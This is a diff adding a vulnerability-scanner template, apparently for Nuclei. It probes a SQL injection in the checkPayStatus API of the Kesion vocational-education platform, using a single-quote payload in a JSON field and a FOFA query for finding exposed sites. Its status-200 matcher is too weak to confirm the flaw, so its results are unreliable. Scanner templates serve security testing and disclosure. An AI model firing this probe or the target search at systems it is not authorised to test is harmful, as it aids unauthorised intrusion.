@@ -1,0 +1,30 @@
+id: poc-ud7p7nmfxqdey1o7
+info:
+  name: 科汛新职教网校系统 checkPayStatus 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ud7p7nmfxqdey1o7'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ud7p7nmfxqdey1o7
+    fofa: (body="/KS_Inc/static/edu") || (body="/tp/PC/skin05" && body="class-type fl type-poster")
+http:
+- raw:
+  - 'POST /Webapi/Common/checkPayStatus HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2246.54 Safari/537.36
+
+    Content-Type: application/json
+
+    Content-Length: 43
+
+
+    {"payorderid":"1''","apptoken":"1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
